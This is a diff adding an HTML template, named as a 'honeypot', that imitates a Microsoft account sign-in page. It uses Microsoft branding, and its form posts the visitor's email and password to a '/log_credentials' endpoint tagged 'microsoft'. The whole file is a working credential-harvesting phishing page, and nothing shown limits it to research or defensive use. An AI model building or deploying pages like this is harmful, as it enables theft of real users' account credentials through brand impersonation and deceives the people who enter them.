@@ -1,0 +1,25 @@
+<!-- templates/adaptive_honeypot_microsoft.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in to your Microsoft Account</title>
+  <link rel="icon" href="https://img.icons8.com/color/48/000000/microsoft.png">
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white flex items-center justify-center min-h-screen">
+
+  <div class="w-full max-w-sm p-8 border rounded shadow-lg">
+    <img src="https://1000logos.net/wp-content/uploads/2021/04/Microsoft-logo.png" class="w-32 mb-6" alt="Microsoft Logo">
+    <h2 class="text-xl font-semibold text-gray-800 mb-4">Sign in</h2>
+
+    <form method="POST" action="/log_credentials">
+      <input type="hidden" name="source" value="microsoft">
+      <input type="email" name="email" placeholder="Email or phone" required class="w-full p-2 mb-4 border rounded">
+      <input type="password" name="password" placeholder="Password" required class="w-full p-2 mb-4 border rounded">
+      <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded">Next</button>
+    </form>
+  </div>
+
+</body>
+</html>
